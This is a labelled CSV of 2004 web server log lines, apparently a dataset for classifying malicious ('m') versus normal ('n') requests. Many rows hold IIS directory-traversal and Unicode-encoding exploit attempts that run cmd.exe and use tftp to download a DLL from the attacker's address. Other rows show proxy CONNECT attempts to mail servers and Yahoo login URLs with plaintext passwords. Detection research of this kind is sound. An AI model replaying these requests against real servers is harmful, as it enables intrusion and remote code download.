rowIndex, row, class
386, 68.48.142.117 - - [09/Mar/2004:23:25:40 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
387, 24.201.201.176 - - [09/Mar/2004:23:25:46 -0500] "POST http://www.ropile.com/ HTTP/1.1" 200 10007 "http://www.bannercell.com" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", n
388, 24.201.201.176 - - [09/Mar/2004:23:25:52 -0500] "GET http://www.ropile.com/index.php?q=NVDbboQgFPwXkvKGy00FNqTpyyZ9aNJfAGVbo6tUsW7T9N970DYBMswcDnPGGWW+FyMMWroWnRdTGyR0KZmq8q006GMN81fGUOPXHXGDupgBA65ShVQFoxVsnUlpULgezaCQ6f+3mWoNLShlJVDKoHUJ8+hu4e+npzFNIzqkZuiafp2HvQuDPu8pRXM6fbpdKULshikVzXQ7HYRb4v2xt+AQeysoxdEeNXix8wQo4DgtVuBkucR911rPK12KuiVCtJpIxzlxXHviFVdBO39tmhKHaDmGaGwQtQ8tFUTLqiJSeUo0rUvC4QwMREEbPNjd5gO/wNq2rXgeE4wY0oub+5CKaX7LmriE12wtD1dBWvfYzRBCZxitldJCSHH++QU= HTTP/1.1" 302 0 "http://www.ropile.com/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", m
389, 24.201.201.176 - - [09/Mar/2004:23:25:52 -0500] "GET http://vaclick.epilot.com/click.aspx?k=buy&b=300&p=epilot&s=ropile&pos=3&t=24&kid=b269537d-33d9-4a22-a29b-b828e9abfcc5&ep=2&sid=e37bed03-9466-48b0-9075-2907e137b30c&l=http:%2F%2Fwww.InternetMarket.org%2F%3FePilot HTTP/1.1" 302 281 "http://www.ropile.com/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", m
390, 24.201.201.176 - - [09/Mar/2004:23:25:54 -0500] "GET http://www.internetmarket.org/?ePilot HTTP/1.1" 200 55506 "http://www.ropile.com/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", n
391, 68.48.142.117 - - [09/Mar/2004:23:26:31 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
392, 212.160.132.1 - - [09/Mar/2004:23:27:13 -0500] "GET http://140.99.44.61/cgi-bin/jenv.cgi HTTP/1.0" 200 965 "-" "fork()", n
393, 212.160.132.1 - - [09/Mar/2004:23:27:14 -0500] "CONNECT www.microsoft.com:80 HTTP/1.0" 200 - "-" "-", n
394, 68.48.142.117 - - [09/Mar/2004:23:27:21 -0500] "GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
395, 68.48.142.117 - - [09/Mar/2004:23:27:21 -0500] "GET /d/httpodbc.dll HTTP/1.0" 404 282 "-" "-", m
396, 80.54.146.135 - - [09/Mar/2004:23:27:32 -0500] "GET http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer HTTP/1.0" 200 21657 "http://strony.wp.pl/wp/secury/" "Mozilla/4.5 [en-us] (WinNT; I)", n
397, 80.54.146.135 - - [09/Mar/2004:23:27:34 -0500] "GET http://www.cybermoo.com/affiliates/click.php?argx=c139ae8a2a33b6c0f1a8dc6f56aaa44ee47cd8eb25f1be578cb2c77b611845b1062fbcb0d42feefc62fb7af11e90390964b25748b6aee2e87640fff7f04b4ca36762c680d8326ab05d440b600605ecde857e6d4e678899c933c4429106c87db41d250ef70aca9a1c09174321c03d9779deb87757b8899b963bbba5139eb151841f500bd0de0e038212f29fef61cf07b5436c7fe65d93037dee3a72c81b6349533c5b5370a35ffa1f7e2b13e884bb81615a233e6b57d2134856402d6c930e2a1ecaad66a7c9ec998929d3b0c1a9ba2534f8ff4e24ff7637b2ad28b8bf1ab72dab34eaaf45da5eadc6c222e4bfa55b84356ab76b9cb3373cc71fb8e7f0002fac707ec4709fc24c4be33297c969cd9582c9c721cfc34af5450700a83886c92c47c5f66c99700847ac91e128ea9fc1f65663272e02c612e31ce5127a09b90c1cfb755f1f3993ca08c8c6aa8277550abb7f5537b3f7da0feeb284d5013fdc00a3df0e0b7a25ac91921988e336bc51a06f27d531048d839a4b36d62c5eff11952c4cda4c630caaeea6d99dff52d22e696ab202c1d05f5aced375b61f0ce5f8810c54167d223091af12f171648492c2da580ae4d981a89aaab06fe7559ed78831953900cb8d85e6e29775dba9652960869d709bf6805a1d8c7af714d45656a3e4dc1983 HTTP/1.0" 302 332 "http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer" "Mozilla/4.5 [en-us] (WinNT; I)", m
398, 80.54.146.135 - - [09/Mar/2004:23:27:35 -0500] "GET http://www.epilot.com/click.aspx?k=digital%20camera%20printer&b=320&p=kanoodle&s=cybermoo&pos=2&sid=9bef258d-4ab1-48ca-83c9-810362d6f41e&l=http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=76242067&lid=bhnnbinmbknibonkbmnibkngbonmbmnn&query=digital%20camera%20printer HTTP/1.0" 302 402 "http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer" "Mozilla/4.5 [en-us] (WinNT; I)", n
399, 80.54.146.135 - - [09/Mar/2004:23:27:36 -0500] "GET http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=76242067&lid=bhnnbinmbknibonkbmnibkngbonmbmnn&query=digital%20camera%20printer HTTP/1.0" 301 352 "http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer" "Mozilla/4.5 [en-us] (WinNT; I)", n
400, 80.54.146.135 - - [09/Mar/2004:23:27:36 -0500] "GET http://www1.ritzcamera.com/?location=KNR318&cat=5739564&tmlpse=true HTTP/1.0" 200 1588 "http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer" "Mozilla/4.5 [en-us] (WinNT; I)", n
401, 203.121.182.139 - - [09/Mar/2004:23:28:10 -0500] "CONNECT 200.248.220.242:25 HTTP/1.0" 200 - "-" "-", n
402, 68.48.142.117 - - [09/Mar/2004:23:28:11 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
403, 192.117.242.67 - - [09/Mar/2004:23:28:21 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
404, 203.121.182.190 - - [09/Mar/2004:23:28:27 -0500] "\x04\x01" 501 - "-" "-", m
405, 68.48.142.117 - - [09/Mar/2004:23:29:04 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
406, 61.172.244.112 - - [09/Mar/2004:23:29:44 -0500] "CONNECT 209.15.20.86:25 HTTP/1.0" 200 - "-" "-", n
407, 68.48.142.117 - - [09/Mar/2004:23:29:54 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
408, 218.78.209.42 - - [09/Mar/2004:23:30:44 -0500] "CONNECT 168.226.152.46:25 HTTP/1.0" 500 434 "-" "-", n
409, 68.48.142.117 - - [09/Mar/2004:23:30:45 -0500] "GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
410, 192.117.242.67 - - [09/Mar/2004:23:30:48 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", 
411, 192.117.242.67 - - [09/Mar/2004:23:30:54 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
412, 24.168.72.174 - - [09/Mar/2004:23:31:21 -0500] "GET http://edit.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus1872&passwd=satan HTTP/1.0" 200 566 "-" "-", n
413, 68.48.142.117 - - [09/Mar/2004:23:31:35 -0500] "GET /scripts/..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
414, 218.29.56.234 - - [09/Mar/2004:23:31:43 -0500] "GET http://www.tosearchit.com/?id=356&q=gambling HTTP/1.1" 200 311 "http://mujweb.cz/www/luckmos/affprogram.htm" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", n
415, 217.136.205.206 - - [09/Mar/2004:23:31:58 -0500] "GET http://members.asstraffic.com/secure/pages/index.php HTTP/1.0" 200 566 "http://members.asstraffic.com:80" "Mozilla/3.01 ( compatible; MSIE 4.0; Windows 95; DigiExt )", n
416, 203.121.182.142 - - [09/Mar/2004:23:32:01 -0500] "CONNECT 221.147.5.145:25 HTTP/1.0" 200 - "-" "-", n
417, 220.173.17.142 - - [09/Mar/2004:23:32:13 -0500] "POST http://www.canada44.ca/ HTTP/1.1" 200 27095 "http://www.so123.com" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
418, 220.173.17.142 - - [09/Mar/2004:23:32:15 -0500] "GET http://www.canada44.ca/index.php?q=LZLbjqJAEIZfZcMtiYKcmp5MNjqCwyggnuXGNNBCIzTQIKCbfffFmb3oVNVff32ppBpBAP/UUIJcTSLurYYq5GRZA7r8KhTIVXfMHq9cBJCzaIMZxc0vG7EbbgiNX50J5Ej5bRkwKhjJYCQK6vD0lyhDDl9/2CLkpFccbMFLiaAwEgRJUwZtoN/rAY5y/G0dxi5zw5zuV7vLfmtsLtyPKcxIeLuz7BstDNsmTVPC8bjruhEKa4xYmIzCIh+XiDUUs3GfZxeKu1GZlL+r9/VhFgS1HRurfpkcPJ6Gp7OSmH67X2TX1pu6y3Nfe/a9pytU0Wsrp4F+XMxo0kwi58AKJpxOOXu0DlU9WV36or1T/KUrqdis5JzsAH+1MyO17/KGCTUht/g4n92crHZWRssyXlE+XQdUarr20Ec821jyzhS7A8vVOmt5+oUdN6hYRW/Pu4OU58St2MY3klIsrvMml0z02Vnj43a112Ic5QY6Z+l62n0luGRzubRWbbKfEhKcGl2Kn4okFV7Da0ThH+uFIh2foUy7p2lFLAyW6Ei7jhRhsX2ofuASPm0Rn4BwO06jmQ5Qwc4H72QtYgZAu/KmcwudSOo6krycVls/FKP+w/afTtFHSm7qC0mQdLLfBZ9aD97/fyXcl4QNByVQFDQAdEmbaG9//wE= HTTP/1.1" 302 695 "http://www.canada44.ca/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", m
419, 220.173.17.142 - - [09/Mar/2004:23:32:15 -0500] "GET http://www.acsearch.com/partner/xml_new.php?q=PVBbbsMgELxKhVQ+ncXY5hFZvUGlfvQAOKYxsQMuxnLaqnfv4jb9WGBnht2dNVror0XXmryvNn6Q46KZ1MT5ZKO36eFq4miT8+fMlEjMu4Rr0siikgWDBkNlsNLEvrl+55HON8q6jPQaCgBRI4TF1wVrm6slv+nJeNObqrqnkzuNa5z2OqrRZEhp1ofDtm3FaHwI/WSLU7gedmEaYljPAwJheprD4pILvhUAiibXt93gz533oQt+7i5+yPG53Wzc4nwzFIdrcbKaWnwwiocoSy6ZbOi+jva+h8cS/jdB98aorYVQXIGgr88vLQADIaXijON34KAqSZc1dxCMZzNoxd5mF9G3039iUTbH7x8= HTTP/1.1" 302 0 "http://www.canada44.ca/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", m
420, 220.173.17.142 - - [09/Mar/2004:23:32:16 -0500] "GET http://www.kanoodle.com/clickthrough.cool?position=7009&tid=bhngbnnobonpbjnhbjnhzwxerwrpxa&bid=0.05&eid=1&id=72238186&query=internet%20marketing&clickid=57793907&UNQ=00107889313186030948&subid=713 HTTP/1.1" 301 343 "http://www.canada44.ca/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
421, 220.173.17.142 - - [09/Mar/2004:23:32:17 -0500] "GET http://www.commerce-database.com/internetmarketing.htm HTTP/1.1" 200 9065 "http://www.canada44.ca/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)", n
422, 68.48.142.117 - - [09/Mar/2004:23:32:28 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
423, 203.121.182.141 - - [09/Mar/2004:23:32:57 -0500] "CONNECT 195.214.161.18:25 HTTP/1.0" 200 - "-" "-", n
424, 217.16.31.38 - - [09/Mar/2004:23:33:01 -0500] "GET http://www.ya.ru/ HTTP/1.1" 200 1346 "http://www.ya.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [en]", n
425, 217.16.31.38 - - [09/Mar/2004:23:33:13 -0500] "GET https://www.chel.mts.ru/sms/cgi-bin/cgi_.exe?function=sms_send HTTP/1.1" 200 23501 "http://www.ya.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [en]", n
426, 203.121.182.189 - - [09/Mar/2004:23:33:16 -0500] "CONNECT 210.242.13.88:25 HTTP/1.0" 200 - "-" "-", n
427, 68.48.142.117 - - [09/Mar/2004:23:33:18 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
428, 203.121.182.144 - - [09/Mar/2004:23:33:28 -0500] "CONNECT 210.210.11.103:25 HTTP/1.0" 200 - "-" "-", n
429, 192.117.242.67 - - [09/Mar/2004:23:33:34 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
430, 61.172.244.216 - - [09/Mar/2004:23:34:04 -0500] "CONNECT 212.118.1.226:25 HTTP/1.0" 200 - "-" "-", n
431, 68.48.142.117 - - [09/Mar/2004:23:34:08 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
432, 68.48.142.117 - - [09/Mar/2004:23:34:59 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
433, 68.48.142.117 - - [09/Mar/2004:23:35:52 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
434, 192.117.242.67 - - [09/Mar/2004:23:36:05 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
435, 192.117.242.67 - - [09/Mar/2004:23:36:13 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
436, 68.48.142.117 - - [09/Mar/2004:23:36:42 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
437, 68.48.142.117 - - [09/Mar/2004:23:37:32 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
438, 203.121.182.139 - - [09/Mar/2004:23:37:39 -0500] "CONNECT 209.15.20.140:25 HTTP/1.0" 200 - "-" "-", n
439, 203.121.182.190 - - [09/Mar/2004:23:38:21 -0500] "\x04\x01" 501 - "-" "-", m
440, 68.48.142.117 - - [09/Mar/2004:23:38:23 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
441, 24.201.201.176 - - [09/Mar/2004:23:38:24 -0500] "GET http://3000search.com/search.php?ID=15862&fString=miami+beach+hotel HTTP/1.1" 302 5 "http://3000search.com/?ID=16602" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
442, 24.201.201.176 - - [09/Mar/2004:23:38:25 -0500] "GET http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel HTTP/1.1" 200 16321 "http://3000search.com/?ID=16602" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
443, 24.201.201.176 - - [09/Mar/2004:23:38:26 -0500] "GET http://3000search.com/redirect.php?fID=163480912 HTTP/1.1" 302 5 "http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
444, 24.201.201.176 - - [09/Mar/2004:23:38:27 -0500] "GET http://click.search123.com/cgi-bin/clickthru.cgi?EI=62793&Q=miami%20beach%20hotel&NGT=CV330kGVYHYwPOO4+Jc9eOfsNfajcy3xxMqrRoDsq6XneYinFCEPqAwd+OOfHjTODY2dOWLmD5x75g8W/In0+/E04NMHuEF0tjOWE0bz2m9DFG+4VwKJotFVlYTgvxMiIucfLR7lKt/ktpzgS8U3KVo0qq+nHpHvyU3uNPJ6oI328xZBN1eTQZQIsLIG5sxIfXjpRYk/L75cO1mHuWiHFUkT3Or0MZMLZS3thzhz4700kksW73c0E5dFOUJDZlQMizMym5qIJDexH2eb88jzh21Ss2c5kp3FNsX/sutQ/NL0CSiDTPlkQ0eV+IdosHkTy+gaEwpcwu09ymkSzn+TNJkLaIsMIraAN0bpOGoy0fo62iai+ueLbJWcnDTeC0ZcmzZuyRzyDk0NRkmvubcg3eHBoNjV5zEqV8Cldm5gbdhKZxCSsDRFcZ3dvhs0fX+C950w/jax+Rk=&x=1&UID=15862&IP=192.168.1.103 HTTP/1.1" 302 525 "http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
445, 24.201.201.176 - - [09/Mar/2004:23:38:28 -0500] "GET http://c.ah-ha.com/c?e1=eD1Oxv5QolLCgHokTmxDEKERyVaopdp2W0lRYtQxlE43VypL1pPVj5M4v2KCGhI5TQebOV4skUAQw4Qq4JZIeEEEcma3iQpKbdTizcXlCmlYq2KFjpz3i1RPwbRLHTrIWkMOjfpCSgrWcFqhsXtPAAjEhrSdRn0kiqmXX0PEPyf12uDFT4AJnuWeYm1OhdLzTwYzOI2WuWGAzfiYTDAPPud0cgpm33eZbmnaIkFeJdhnvnOwOjAHYponPl3bRh3nOJt5UXdQRmvLoFnZcJigXuqMAHEUe&h=pKKOOBMIZbBbImCH3&b=29269 HTTP/1.1" 302 0 "http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
446, 24.201.201.176 - - [09/Mar/2004:23:38:28 -0500] "GET http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLCgHokTmxDEKERyVaopdp2W0lRYtQxlE43VypL1pPVj5M4v2KCGhI5TQebOV4skUAQw4Qq4JZIeEEEcma3iQpKbdTizcXlCmlYq2KFjpz3i1RPwbRLHTrIWkMOjfpCSgrWcFqhsXtPAAjEhrSdRn0kiqmXX0PEPyf12uDFT4AJnuWeYm1OhdLzTwYzOI2WuWGAzfiYTDAPPud0cgpm33eZbmnaIkFeJdhnvnOwOjAHYponPl3bRh3nOJt5UXdQRmvLoFnZcJigXuqMAHEUe&h=pKKOOBMIZbBbImCH3&b=29269 HTTP/1.1" 302 0 "http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", m
447, 24.201.201.176 - - [09/Mar/2004:23:38:29 -0500] "GET http://www.smartpages.com/index.jhtml?From=ah-ha.com HTTP/1.1" 200 8272 "http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)", n
448, 192.117.242.67 - - [09/Mar/2004:23:38:56 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
449, 66.36.242.145 - - [09/Mar/2004:23:39:01 -0500] "GET http://atomintersoft.info/ap/env/1/ HTTP/1.1" 200 797 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)", n
450, 68.48.142.117 - - [09/Mar/2004:23:39:13 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
451, 66.36.242.145 - - [09/Mar/2004:23:39:26 -0500] "GET http://www.webconnections.net/cgi-bin/whois.cgi?domain=217.44.102.129&stripheader=1&quiet=1 HTTP/1.1" 200 3871 "-" "-", n
452, 66.36.242.145 - - [09/Mar/2004:23:39:30 -0500] "GET http://www.webconnections.net/cgi-bin/whois.cgi?domain=217.44.102.129&stripheader=1&quiet=1 HTTP/1.1" 200 3871 "-" "-", n
453, 24.168.72.174 - - [09/Mar/2004:23:39:49 -0500] "GET http://edit.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exoduscold&passwd=SATAN HTTP/1.0" 200 566 "-" "-", n
454, 68.48.142.117 - - [09/Mar/2004:23:40:03 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
455, 68.48.142.117 - - [09/Mar/2004:23:40:03 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
456, 68.48.142.117 - - [09/Mar/2004:23:40:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
457, 68.48.142.117 - - [09/Mar/2004:23:40:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
458, 68.48.142.117 - - [09/Mar/2004:23:40:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
459, 68.48.142.117 - - [09/Mar/2004:23:40:04 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
460, 68.48.142.117 - - [09/Mar/2004:23:40:04 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
461, 68.48.142.117 - - [09/Mar/2004:23:40:04 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
462, 68.48.142.117 - - [09/Mar/2004:23:40:04 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
463, 68.48.142.117 - - [09/Mar/2004:23:40:05 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
464, 68.48.142.117 - - [09/Mar/2004:23:40:05 -0500] "GET /scripts/..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
465, 68.48.142.117 - - [09/Mar/2004:23:40:05 -0500] "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 305 "-" "-", m
466, 68.48.142.117 - - [09/Mar/2004:23:40:05 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
467, 68.48.142.117 - - [09/Mar/2004:23:40:05 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
468, 68.48.142.117 - - [09/Mar/2004:23:40:05 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
469, 68.48.142.117 - - [09/Mar/2004:23:40:05 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
470, 68.48.142.117 - - [09/Mar/2004:23:40:06 -0500] "GET /scripts/..%c0%af../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
471, 68.48.142.117 - - [09/Mar/2004:23:40:06 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
472, 68.48.142.117 - - [09/Mar/2004:23:40:06 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
473, 68.48.142.117 - - [09/Mar/2004:23:40:06 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
474, 68.48.142.117 - - [09/Mar/2004:23:40:06 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
475, 68.48.142.117 - - [09/Mar/2004:23:40:06 -0500] "GET /scripts/..%c1%9c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
476, 68.48.142.117 - - [09/Mar/2004:23:40:07 -0500] "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-", m
477, 68.48.142.117 - - [09/Mar/2004:23:40:07 -0500] "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-", m
478, 68.48.142.117 - - [09/Mar/2004:23:41:00 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
479, 192.117.242.67 - - [09/Mar/2004:23:41:08 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
480, 192.117.242.67 - - [09/Mar/2004:23:41:09 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
